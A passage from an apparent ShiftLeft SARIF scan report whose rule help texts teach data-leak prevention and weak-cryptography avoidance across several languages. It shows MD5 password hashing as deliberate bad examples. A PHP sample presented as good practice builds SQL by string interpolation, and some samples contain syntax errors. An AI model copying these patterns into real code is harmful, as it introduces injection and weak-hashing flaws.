Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/6d9213d44889591971d9cc561176eafe20b509d8b16cf97b0f92e1791d01c998",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Usage of a broken cryptographic algorithm was identified."
                            },
                            "help": {
                                "markdown": "Usage of a broken cryptographic algorithm was identified.\n\n# Encryption Vulnerabilities\n\nEncryption powers the modern internet, allowing secure storage of data and transmission of secrets across a network\nin such a way they cannot be inspected or tampered with by a third party. It is important that you use *strong\nencryption* algorithms when securing data in this way, or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power.\n\n## Encryption Algorithms\n\nEncryption algorithms are designed to encode the contents of a string or binary object in such away that an attacker\nwho does not possession the decryption key will not be able to decipher the contents. *Cryptography* - the study of \nencryption algorithms - is a complex field, and new encryption algorithms are invented by mathematicians frequently.\n\nAs computing power gets cheaper, it becomes easier for an attacker to use brute-force to decrypt the contents of \nencrypted data. For this reason, it's important to use modern encryption algorithms in your code, so your secrets\nremain safe.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following Java function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```java\npublic static String hashPassword(String password) throws java.security.NoSuchAlgorithmException\n{\n   java.security.MessageDigest digest = java.security.MessageDigest.getInstance(\"MD5\");\n   byte[] bytes = md.digest(password.getBytes());\n   \n   return org.apache.commons.codec.binary.Hex.encodeHexString(bytes);\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[C#]\n\nConsider the following C# function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```csharp\n// An example of weak password hash. Don't use MD5 to encrypt passwords!\npublic static string HashPassword(string password)\n{\n    using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())\n    {\n        byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(password);\n        byte[] hashBytes  = md5.ComputeHash(inputBytes);\n\n        // Convert the byte array to hexadecimal string.\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < hashBytes.Length; i++)\n        {\n            sb.Append(hashBytes[i].ToString(\"X2\"));\n        }\n        \n        return sb.ToString();\n    }\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following Node.js function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```javascript\nconst crypto = require('crypto')\n\nfunction encryptPassword(password) {\n  return crypto.createHash('md5').update('password).digest(\"hex\")\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Python]\n\nConsider the following Python function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```python\nimport hashlib\n\ndef encrypt_password(password):\n  return hashlib.md5(password.encode('utf-8')).hexdigest()\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Scala]\n\nConsider the following Scala function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```scala\nimport java.security.MessageDigest\n\ndef encryptPassword(password: String) = {\n    MessageDigest.getInstance(\"MD5\").digest(password.getBytes).map(\"%02X\" format _).mkString\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[Go]\n\nConsider the following Go function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```go\nimport (\n  \"crypto/md5\"\n  \"encoding/hex\"\n)\n\nfunc HashPassword(password string) string {\n   hash := md5.Sum([]byte(password))\n   return hex.EncodeToString(hash[:])\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[PHP]\n\n## Encryption Vulnerabilities in PHP\n\nIn PHP, it's crucial to use modern and secure encryption methods. Relying on outdated or weak encryption functions can expose sensitive data to attackers. Consider the use of the `mcrypt` extension, which has been deprecated since PHP 7.1.0 due to its aging algorithms and its lack of support for modern cryptography:\n\n```php\nfunction encryptData($data, $key) {\n    $ivSize = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);\n    $iv = mcrypt_create_iv($ivSize, MCRYPT_RAND);\n    return mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);\n}\n```\n\nUsing the `mcrypt` functions in modern applications is not recommended. They utilize older algorithms, are not maintained, and might contain vulnerabilities.\n\n## Mitigation\n\n1. **Use Modern Encryption Libraries**: PHP has the `openssl` extension, which provides a rich set of low-level cryptographic operations. It unfortunately does not come with good high-level abstractions for the most common cryptographic needs.\n\n```php\nfunction encryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    $ivlen = openssl_cipher_iv_length($cipher=$cipher);\n    $iv = random_bytes($ivlen);\n    $ciphertext = openssl_encrypt($data, $cipher, $key, $options=0, $iv, $tag);\n    return json_encode([base64_encode($iv), base64_encode($tag), base64_encode($ciphertext)]);\n}\nfunction decryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    [$iv, $tag, $ciphertext] = json_decode($data);\n    return openssl_decrypt(base64_decode($ciphertext), $cipher, $key, $options=0, base64_decode($iv), base64_decode($tag));\n}\n```\n\n2. **Avoid Deprecated Encryption Extensions**: Steer clear of deprecated extensions like `mcrypt`. Instead, use more modern extensions like `openssl`.\n\n3. **Regularly Update and Review**: Cryptography standards evolve over time. Ensure that your encryption methods are updated regularly to align with best practices.\n\n:::\n\n::::\n\n## Encoding is Not Encryption\n\nEncodings like Base64 are a common method of transforming binary data to text before transmission. Anybody can decode \nBase64 text, however - do not depend on encoding methods to hide secrets from attackers!\n\n## Don't Invent Your Own Encryption Algorithms\n\nAvoid the temptation to roll your own encryption algorithm. Cryptography is hard, and designing your own cryptographic \nschemes when well-studied encryption algorithms are freely available is asking for trouble.\n\n## Symmetric vs Asymmetric Encryption Algorithms\n\nAn encryption algorithm that uses the same key to encrypt and decrypt data is called a *symmetric algorithm*. An \n*asymmetric algorithm* uses different keys to encrypt and decrypt data, and has the advantage that the encryption key\ncan be made public, allowing anyone to securely encrypt data in a way that only the holder of the decryption key can\nread. For this reason, asymmetric algorithms are commonly called **public-key** algorithms. However, common asymmetric\nciphers can be broken when they are used directly with arbitrary untrusted inputs. Often, a hybrid scheme combining\nboth symmetric and asymmetric encryption needs to be used to avoid the problems that each scheme would have on its own.\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**",
                                "text": "Usage of a broken cryptographic algorithm was identified.\n\n# Encryption Vulnerabilities\n\nEncryption powers the modern internet, allowing secure storage of data and transmission of secrets across a network\nin such a way they cannot be inspected or tampered with by a third party. It is important that you use *strong\nencryption* algorithms when securing data in this way, or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power.\n\n## Encryption Algorithms\n\nEncryption algorithms are designed to encode the contents of a string or binary object in such away that an attacker\nwho does not possession the decryption key will not be able to decipher the contents. *Cryptography* - the study of \nencryption algorithms - is a complex field, and new encryption algorithms are invented by mathematicians frequently.\n\nAs computing power gets cheaper, it becomes easier for an attacker to use brute-force to decrypt the contents of \nencrypted data. For this reason, it's important to use modern encryption algorithms in your code, so your secrets\nremain safe.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following Java function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```java\npublic static String hashPassword(String password) throws java.security.NoSuchAlgorithmException\n{\n   java.security.MessageDigest digest = java.security.MessageDigest.getInstance(\"MD5\");\n   byte[] bytes = md.digest(password.getBytes());\n   \n   return org.apache.commons.codec.binary.Hex.encodeHexString(bytes);\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[C#]\n\nConsider the following C# function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```csharp\n// An example of weak password hash. Don't use MD5 to encrypt passwords!\npublic static string HashPassword(string password)\n{\n    using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())\n    {\n        byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(password);\n        byte[] hashBytes  = md5.ComputeHash(inputBytes);\n\n        // Convert the byte array to hexadecimal string.\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < hashBytes.Length; i++)\n        {\n            sb.Append(hashBytes[i].ToString(\"X2\"));\n        }\n        \n        return sb.ToString();\n    }\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following Node.js function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```javascript\nconst crypto = require('crypto')\n\nfunction encryptPassword(password) {\n  return crypto.createHash('md5').update('password).digest(\"hex\")\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Python]\n\nConsider the following Python function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```python\nimport hashlib\n\ndef encrypt_password(password):\n  return hashlib.md5(password.encode('utf-8')).hexdigest()\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Scala]\n\nConsider the following Scala function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```scala\nimport java.security.MessageDigest\n\ndef encryptPassword(password: String) = {\n    MessageDigest.getInstance(\"MD5\").digest(password.getBytes).map(\"%02X\" format _).mkString\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[Go]\n\nConsider the following Go function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```go\nimport (\n  \"crypto/md5\"\n  \"encoding/hex\"\n)\n\nfunc HashPassword(password string) string {\n   hash := md5.Sum([]byte(password))\n   return hex.EncodeToString(hash[:])\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[PHP]\n\n## Encryption Vulnerabilities in PHP\n\nIn PHP, it's crucial to use modern and secure encryption methods. Relying on outdated or weak encryption functions can expose sensitive data to attackers. Consider the use of the `mcrypt` extension, which has been deprecated since PHP 7.1.0 due to its aging algorithms and its lack of support for modern cryptography:\n\n```php\nfunction encryptData($data, $key) {\n    $ivSize = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);\n    $iv = mcrypt_create_iv($ivSize, MCRYPT_RAND);\n    return mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);\n}\n```\n\nUsing the `mcrypt` functions in modern applications is not recommended. They utilize older algorithms, are not maintained, and might contain vulnerabilities.\n\n## Mitigation\n\n1. **Use Modern Encryption Libraries**: PHP has the `openssl` extension, which provides a rich set of low-level cryptographic operations. It unfortunately does not come with good high-level abstractions for the most common cryptographic needs.\n\n```php\nfunction encryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    $ivlen = openssl_cipher_iv_length($cipher=$cipher);\n    $iv = random_bytes($ivlen);\n    $ciphertext = openssl_encrypt($data, $cipher, $key, $options=0, $iv, $tag);\n    return json_encode([base64_encode($iv), base64_encode($tag), base64_encode($ciphertext)]);\n}\nfunction decryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    [$iv, $tag, $ciphertext] = json_decode($data);\n    return openssl_decrypt(base64_decode($ciphertext), $cipher, $key, $options=0, base64_decode($iv), base64_decode($tag));\n}\n```\n\n2. **Avoid Deprecated Encryption Extensions**: Steer clear of deprecated extensions like `mcrypt`. Instead, use more modern extensions like `openssl`.\n\n3. **Regularly Update and Review**: Cryptography standards evolve over time. Ensure that your encryption methods are updated regularly to align with best practices.\n\n:::\n\n::::\n\n## Encoding is Not Encryption\n\nEncodings like Base64 are a common method of transforming binary data to text before transmission. Anybody can decode \nBase64 text, however - do not depend on encoding methods to hide secrets from attackers!\n\n## Don't Invent Your Own Encryption Algorithms\n\nAvoid the temptation to roll your own encryption algorithm. Cryptography is hard, and designing your own cryptographic \nschemes when well-studied encryption algorithms are freely available is asking for trouble.\n\n## Symmetric vs Asymmetric Encryption Algorithms\n\nAn encryption algorithm that uses the same key to encrypt and decrypt data is called a *symmetric algorithm*. An \n*asymmetric algorithm* uses different keys to encrypt and decrypt data, and has the advantage that the encryption key\ncan be made public, allowing anyone to securely encrypt data in a way that only the holder of the decryption key can\nread. For this reason, asymmetric algorithms are commonly called **public-key** algorithms. However, common asymmetric\nciphers can be broken when they are used directly with arbitrary untrusted inputs. Often, a hybrid scheme combining\nboth symmetric and asymmetric encryption needs to be used to avoid the problems that each scheme would have on its own.\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/327.html",
                            "id": "weak-crypto-des/eb715e59c483d563f7ca043e0dba964b",
                            "name": "Weak Cipher: Use Of A Broken Cryptographic Algorithm In Order.js:encryptdata",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "9",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 9",
                                    "CWE 327",
                                    "Cryptography",
                                    "OWASP 2021 a02-cryptographic-failures",
                                    "OWASP a02-2021-cryptographic-failures",
                                    "OWASP a3-sensitive-data-exposure",
                                    "Weak Cipher"
                                ]
                            },
                            "shortDescription": {
                                "text": "Weak Cipher: Use of a Broken Cryptographic Algorithm in Order.js:encryptData"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Pug through 3.0.2 allows JavaScript code execution if an application accepts untrusted input for the name option of the `compileClient`, `compileFileClient`, or `compileClientWithDependenciesTracked` function. NOTE: these functions are for compiling Pug templates into JavaScript, and there would typically be no reason to allow untrusted callers."
                            },
                            "help": {
                                "markdown": "Pug through 3.0.2 allows JavaScript code execution if an application accepts untrusted input for the name option of the `compileClient`, `compileFileClient`, or `compileClientWithDependenciesTracked` function. NOTE: these functions are for compiling Pug templates into JavaScript, and there would typically be no reason to allow untrusted callers.",
                                "text": "Pug through 3.0.2 allows JavaScript code execution if an application accepts untrusted input for the name option of the `compileClient`, `compileFileClient`, or `compileClientWithDependenciesTracked` function. NOTE: these functions are for compiling Pug templates into JavaScript, and there would typically be no reason to allow untrusted callers."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/94.html",
                            "id": "oss_vuln/3a017b624b4b9263d3a3eb2303fcdc73",
                            "name": "Pkg:npm/Pug@2.0.4",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "6.8",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-36361",
                                    "CVSS 6.8",
                                    "CWE 1035",
                                    "CWE 937",
                                    "CWE 94",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/pug@2.0.4"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Attacker-controlled data is used in a code execution context without undergoing escaping or validation. This indicates a remote code execution vulnerability."
                            },
                            "help": {
